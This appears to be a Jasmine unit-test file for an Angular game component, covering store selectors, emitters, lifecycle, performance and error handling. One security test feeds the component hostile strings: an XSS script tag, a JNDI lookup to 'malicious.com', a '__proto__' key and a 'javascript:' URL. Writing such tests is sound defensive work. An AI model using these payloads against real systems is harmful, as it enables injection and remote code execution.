import { ComponentFixture, TestBed, async } from '@angular/core/testing';
import { Store } from '@ngrx/store';
import { of } from 'rxjs';
import { GameComponent } from './game.component';
import { AppState } from '../../store/app-state';

describe('GameComponent', () => {
  let component: GameComponent;
  let fixture: ComponentFixture<GameComponent>;
  let mockStore: jasmine.SpyObj<Store<AppState>>;

  const mockGameState = {
    stage: 'education',
    avatar: {
      firstName: 'John',
      lastName: 'Doe',
      gender: 'male'
    },
    day: 1,
    currency: 100
  };

  beforeEach(async(() => {
    const storeSpy = jasmine.createSpyObj('Store', ['pipe', 'dispatch']);

    TestBed.configureTestingModule({
      declarations: [GameComponent],
      providers: [
        { provide: Store, useValue: storeSpy }
      ]
    }).compileComponents();

    mockStore = TestBed.inject(Store) as jasmine.SpyObj<Store<AppState>>;
  }));

  beforeEach(() => {
    fixture = TestBed.createComponent(GameComponent);
    component = fixture.componentInstance;

    // Setup store mock returns
    mockStore.pipe.and.callFake((selector: any) => {
      // Mock different selectors
      if (selector.toString().includes('selectGame')) {
        return of(mockGameState);
      }
      if (selector.toString().includes('selectStage')) {
        return of('education');
      }
      if (selector.toString().includes('selectFullName')) {
        return of('John Doe');
      }
      if (selector.toString().includes('selectDay')) {
        return of(1);
      }
      if (selector.toString().includes('selectCurrency')) {
        return of(100);
      }
      return of(null);
    });

    fixture.detectChanges();
  });

  it('should create', () => {
    expect(component).toBeTruthy();
  });

  describe('Component State', () => {
    it('should initialize observables correctly', () => {
      expect(component.gameState$).toBeDefined();
      expect(component.stage$).toBeDefined();
      expect(component.avatarName$).toBeDefined();
      expect(component.day$).toBeDefined();
      expect(component.currency$).toBeDefined();
    });

    it('should emit correct values from observables', (done) => {
      let completedChecks = 0;
      const totalChecks = 5;

      component.gameState$.subscribe(state => {
        expect(state).toEqual(mockGameState);
        if (++completedChecks === totalChecks) done();
      });

      component.stage$.subscribe(stage => {
        expect(stage).toBe('education');
        if (++completedChecks === totalChecks) done();
      });

      component.avatarName$.subscribe(name => {
        expect(name).toBe('John Doe');
        if (++completedChecks === totalChecks) done();
      });

      component.day$.subscribe(day => {
        expect(day).toBe(1);
        if (++completedChecks === totalChecks) done();
      });

      component.currency$.subscribe(currency => {
        expect(currency).toBe(100);
        if (++completedChecks === totalChecks) done();
      });
    });
  });

  describe('Event Emitters', () => {
    it('should emit openSidenav event when openSidenav is called', () => {
      spyOn(component.openSidenavEmitter, 'emit');
      
      component.openSidenav();
      
      expect(component.openSidenavEmitter.emit).toHaveBeenCalled();
    });

    it('should have correct event emitter configuration', () => {
      expect(component.openSidenavEmitter).toBeDefined();
      expect(component.openSidenavEmitter.constructor.name).toBe('EventEmitter');
    });
  });

  describe('Component Integration', () => {
    it('should handle store selector changes', (done) => {
      // Change the mock return value
      mockStore.pipe.and.returnValue(of({
        ...mockGameState,
        day: 2,
        currency: 200
      }));

      // Recreate component to test new values
      fixture = TestBed.createComponent(GameComponent);
      component = fixture.componentInstance;
      fixture.detectChanges();

      component.gameState$.subscribe(state => {
        expect(state.day).toBe(2);
        expect(state.currency).toBe(200);
        done();
      });
    });

    it('should handle null/undefined state gracefully', () => {
      mockStore.pipe.and.returnValue(of(null));

      fixture = TestBed.createComponent(GameComponent);
      component = fixture.componentInstance;
      
      expect(() => {
        fixture.detectChanges();
      }).not.toThrow();
    });
  });

  describe('Security and Validation', () => {
    it('should handle malicious state data', () => {
      const maliciousState = {
        stage: '<script>alert("xss")</script>',
        avatar: {
          firstName: '${jndi:ldap://malicious.com}',
          lastName: '__proto__',
          gender: 'javascript:void(0)'
        },
        day: Infinity,
        currency: -1
      };

      mockStore.pipe.and.returnValue(of(maliciousState));

      fixture = TestBed.createComponent(GameComponent);
      component = fixture.componentInstance;
      
      expect(() => {
        fixture.detectChanges();
      }).not.toThrow();

      // Component should handle malicious data without crashing
      expect(component).toBeTruthy();
    });
  });

  describe('Performance Tests', () => {
    it('should handle frequent state updates efficiently', (done) => {
      let updateCount = 0;
      const maxUpdates = 1000;
      
      const startTime = performance.now();

      // Create observable that emits frequently
      const rapidUpdates$ = of(...Array(maxUpdates).fill(0).map((_, i) => ({
        ...mockGameState,
        day: i + 1
      })));

      mockStore.pipe.and.returnValue(rapidUpdates$);
      
      fixture = TestBed.createComponent(GameComponent);
      component = fixture.componentInstance;
      fixture.detectChanges();

      component.gameState$.subscribe(state => {
        updateCount++;
        
        if (updateCount === maxUpdates) {
          const endTime = performance.now();
          const duration = endTime - startTime;
          
          expect(duration).toBeLessThan(5000); // Should handle 1000 updates within 5 seconds
          expect(updateCount).toBe(maxUpdates);
          done();
        }
      });
    });

    it('should maintain reasonable memory usage', () => {
      // Create and destroy multiple component instances
      for (let i = 0; i < 100; i++) {
        const testFixture = TestBed.createComponent(GameComponent);
        testFixture.detectChanges();
        testFixture.destroy();
      }

      // Should not crash or cause memory issues
      expect(component).toBeTruthy();
    });
  });

  describe('OnPush Change Detection', () => {
    it('should use OnPush change detection strategy', () => {
      // This is more of a configuration test
      const componentDef = (component.constructor as any).ɵcmp;
      expect(componentDef).toBeDefined();
      // OnPush change detection should be configured in the component decorator
    });

    it('should only update when observables emit new values', (done) => {
      let changeDetectionRuns = 0;
      
      // Spy on detectChanges to count how many times it's called
      const originalDetectChanges = fixture.detectChanges;
      fixture.detectChanges = function() {
        changeDetectionRuns++;
        return originalDetectChanges.call(this);
      };

      // Emit same value multiple times (should not trigger change detection)
      const sameValueObservable = of(mockGameState, mockGameState, mockGameState);
      mockStore.pipe.and.returnValue(sameValueObservable);

      fixture = TestBed.createComponent(GameComponent);
      component = fixture.componentInstance;
      fixture.detectChanges();

      setTimeout(() => {
        // Should not have excessive change detection runs
        expect(changeDetectionRuns).toBeLessThan(10);
        done();
      }, 100);
    });
  });

  describe('Error Handling', () => {
    it('should handle store errors gracefully', () => {
      mockStore.pipe.and.throwError('Store connection error');

      expect(() => {
        fixture = TestBed.createComponent(GameComponent);
        component = fixture.componentInstance;
        fixture.detectChanges();
      }).not.toThrow();
    });

    it('should handle selector errors', (done) => {
      mockStore.pipe.and.callFake(() => {
        throw new Error('Selector error');
      });

      fixture = TestBed.createComponent(GameComponent);
      component = fixture.componentInstance;

      // Should handle error without crashing
      expect(component).toBeTruthy();
      done();
    });
  });

  describe('Component Lifecycle', () => {
    it('should initialize properly', () => {
      expect(component).toBeTruthy();
      expect(mockStore.pipe).toHaveBeenCalledTimes(5); // One for each selector
    });

    it('should clean up properly on destroy', () => {
      spyOn(component, 'ngOnDestroy').and.callThrough();
      
      fixture.destroy();
      
      expect(component.ngOnDestroy).toHaveBeenCalled();
    });

    it('should handle multiple initialization/destruction cycles', () => {
      for (let i = 0; i < 10; i++) {
        const testFixture = TestBed.createComponent(GameComponent);
        const testComponent = testFixture.componentInstance;
        testFixture.detectChanges();
        
        expect(testComponent).toBeTruthy();
        
        testFixture.destroy();
      }
      
      // Original component should still be functional
      expect(component).toBeTruthy();
    });
  });
});